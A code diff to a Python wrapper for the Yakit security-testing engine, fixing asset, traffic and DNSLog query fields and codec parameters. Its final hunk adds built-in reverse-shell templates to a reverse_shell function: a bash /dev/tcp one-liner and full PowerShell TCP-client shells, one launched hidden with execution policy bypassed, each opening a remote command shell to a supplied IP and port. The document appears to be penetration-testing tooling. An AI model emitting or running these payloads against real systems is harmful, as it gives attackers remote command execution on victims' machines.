@@ -483,10 +483,12 @@ def convert_to_httpflow(engine: YakEngine, fuzzer_response: ypb.FuzzerResponse) 
 
 
 def query_http_flows(engine: YakEngine, keyword: str = "", limit: int = 20) -> dict:
-    """查询历史 HTTP 流量"""
+    """查询历史 HTTP 流量（keyword 匹配 URL，引擎层 Keyword+IncludeInUrl 双通道）"""
     stub = engine.connect()
     req = ypb.QueryHTTPFlowRequest()
     req.Keyword = keyword
+    if keyword:
+        req.IncludeInUrl.append(keyword)
     req.Pagination.Limit = limit
     req.Pagination.Page = 1
     try:
@@ -805,6 +807,8 @@ def simple_detect(engine: YakEngine, targets: str, ports: str = "80,443",
         results = []
         for resp in stub.SimpleDetect(record, timeout=total_timeout + 30):
             text = resp.Message or resp.Raw or b""
+            if isinstance(text, bytes):
+                text = text.decode("utf-8", errors="replace")
             if text:
                 results.append(text)
         return {"ok": True, "targets": targets, "results": results[:200]}
@@ -868,12 +872,15 @@ def basic_crawler(engine: YakEngine, target: str, max_depth: int = 2,
     stub = engine.connect()
     try:
         req = ypb.StartBasicCrawlerRequest()
-        req.Target = target
-        req.MaxDepth = max_depth
-        req.MaxUrls = max_urls
+        req.Targets = target
+        req.MaxDepth = str(max_depth)
+        req.MaxCountOfLinks = str(max_urls)
         req.Concurrent = concurrent
         resp = stub.StartBasicCrawler(req, timeout=300)
-        return {"ok": True, "result": resp.Raw or resp.Message or ""}
+        text = resp.Message or resp.Raw or b""
+        if isinstance(text, bytes):
+            text = text.decode("utf-8", errors="replace")
+        return {"ok": True, "results": [text] if text else []}
     except Exception as e:
         return {"ok": False, "reason": repr(e)}
 
@@ -901,12 +908,13 @@ def query_ports(engine: YakEngine, keyword: str = "", limit: int = 50,
             items.append({
                 "id": p.Id,
                 "host": p.Host,
+                "ip_integer": p.IPInteger,
                 "port": p.Port,
-                "service": p.Service,
-                "state": p.State,
-                "title": p.Title,
                 "proto": p.Proto,
+                "service": p.ServiceType,
+                "state": p.State,
                 "fingerprint": p.Fingerprint,
+                "title": p.HtmlTitle,
                 "updated_at": p.UpdatedAt,
             })
         return {"ok": True, "total": resp.Total, "ports": items}
@@ -915,24 +923,23 @@ def query_ports(engine: YakEngine, keyword: str = "", limit: int = 50,
 
 
 def query_hosts(engine: YakEngine, keyword: str = "", limit: int = 50) -> dict:
-    """查询主机资产"""
+    """查询主机资产（keyword 匹配域名/网段）"""
     stub = engine.connect()
     try:
         req = ypb.QueryHostsRequest()
         req.Pagination.Limit = limit
         req.Pagination.Page = 1
         if keyword:
-            req.Keywords = keyword
+            req.DomainKeyword = keyword
         resp = stub.QueryHosts(req)
         items = []
         for h in resp.Data or []:
             items.append({
                 "id": h.Id,
                 "ip": h.IP,
-                "domain": h.Domain,
+                "ip_integer": h.IPInteger,
                 "is_public": h.IsInPublicNet,
-                "ports_count": h.Ports,
-                "updated_at": h.UpdatedAt,
+                "domains": list(h.Domains or []),
             })
         return {"ok": True, "total": resp.Total, "hosts": items}
     except Exception as e:
@@ -940,22 +947,22 @@ def query_hosts(engine: YakEngine, keyword: str = "", limit: int = 50) -> dict:
 
 
 def query_domains(engine: YakEngine, keyword: str = "", limit: int = 50) -> dict:
-    """查询域名资产"""
+    """查询域名资产（keyword 匹配域名关键词）"""
     stub = engine.connect()
     try:
         req = ypb.QueryDomainsRequest()
         req.Pagination.Limit = limit
         req.Pagination.Page = 1
         if keyword:
-            req.Keywords = keyword
+            req.DomainKeyword = keyword
         resp = stub.QueryDomains(req)
         items = []
         for d in resp.Data or []:
             items.append({
-                "id": d.Id,
-                "domain": d.Domain,
-                "ip": d.IP,
-                "updated_at": d.UpdatedAt,
+                "id": d.ID,
+                "domain": d.DomainName,
+                "ip": d.IPAddr,
+                "title": d.HTTPTitle,
             })
         return {"ok": True, "total": resp.Total, "domains": items}
     except Exception as e:
@@ -995,14 +1002,40 @@ def query_risks(engine: YakEngine, keyword: str = "", limit: int = 50,
 # ---------------------------------------------------------------------------
 # 编码工具: Codec / DNSLog / 反连
 # ---------------------------------------------------------------------------
-def codec(engine: YakEngine, text: str, codec_type: str = "Base64Encode") -> dict:
-    """编解码（NewCodec 流式接口，前端同款）。codec_type 用 yakit_codec_methods 查（如 Base64Encode/Base64Decode/UrlEncode/SHA1）"""
+def codec(engine: YakEngine, text: str, codec_type: str = "Base64Encode",
+          params: str = "{}") -> dict:
+    """
+    编解码（NewCodec 流式接口，前端同款）。
+    codec_type 用 yakit_codec_methods 查（如 Base64Encode/Base64Decode/UrlEncode/SHA1）。
+    params: 可选参数 JSON（如 {"Alphabet": "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"}）。
+            默认自动用方法的 DefaultValue 填充必填参数。
+    """
     stub = engine.connect()
     try:
+        # 1) 查方法定义拿默认参数（解决 base64 需要 Alphabet 等必填参数问题）
+        default_params = {}
+        try:
+            resp_m = stub.GetAllCodecMethods(ypb.Empty())
+            for m in resp_m.Methods or []:
+                if m.CodecMethod == codec_type:
+                    for p in m.Params or []:
+                        if p.DefaultValue:
+                            default_params[p.Name] = p.DefaultValue
+                    break
+        except Exception:
+            pass
+        supplied = json.loads(params) if params else {}
+        merged = {**default_params, **supplied}
+
         req = ypb.CodecRequestFlow()
         req.Text = text
         work = ypb.CodecWork()
         work.CodecType = codec_type
+        for k, v in merged.items():
+            pv = ypb.ExecParamItem()
+            pv.Key = k
+            pv.Value = str(v)
+            work.Params.append(pv)
         req.WorkFlow.append(work)
         resp = stub.NewCodec(req, timeout=30)
         return {"ok": True, "type": codec_type, "input": text[:500],
@@ -1047,12 +1080,14 @@ def dnslog_query(engine: YakEngine, token: str) -> dict:
         req.Token = token
         resp = stub.QueryDNSLogByToken(req)
         logs = []
-        for l in resp.Data or []:
+        for l in resp.Events or []:
             logs.append({
+                "dns_type": l.DNSType,
+                "token": l.Token,
                 "domain": l.Domain,
-                "type": l.Type,
                 "remote_addr": l.RemoteAddr,
-                "raw": (l.Raw or "")[:300],
+                "remote_ip": l.RemoteIP,
+                "remote_port": l.RemotePort,
                 "timestamp": l.Timestamp,
             })
         return {"ok": True, "token": token, "logs": logs}
@@ -1202,6 +1237,7 @@ def reverse_shell(engine: YakEngine, ip: str, port: int,
     system: linux/windows; shell_type: bash/sh/cmd/powershell 等; encode: 可选编码
     """
     stub = engine.connect()
+    reason = "engine returned empty result"
     try:
         req = ypb.GenerateReverseShellCommandRequest()
         req.IP = ip
@@ -1212,9 +1248,25 @@ def reverse_shell(engine: YakEngine, ip: str, port: int,
         if encode:
             req.Encode = encode
         resp = stub.GenerateReverseShellCommand(req)
-        return {"ok": True, "result": resp.Result or ""}
+        if resp.Result:
+            return {"ok": True, "result": resp.Result or "", "source": "engine"}
     except Exception as e:
-        return {"ok": False, "reason": repr(e)}
+        reason = repr(e)
+    # 引擎不可用时（ProgramList 为空）用内置模板兜底
+    templates = {
+        "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
+        "sh": f"sh -i >& /dev/tcp/{ip}/{port} 0>&1",
+        "powershell": f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
+        "cmd": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
+    }
+    tpl = templates.get(shell_type) or templates.get("bash")
+    return {
+        "ok": True,
+        "result": tpl,
+        "source": "template",
+        "note": "引擎模板不可用，已返回内置模板（source=engine 时为引擎生成）",
+        "engine_error": reason,
+    }
 
 
 def reverse_shell_programs(engine: YakEngine) -> dict:
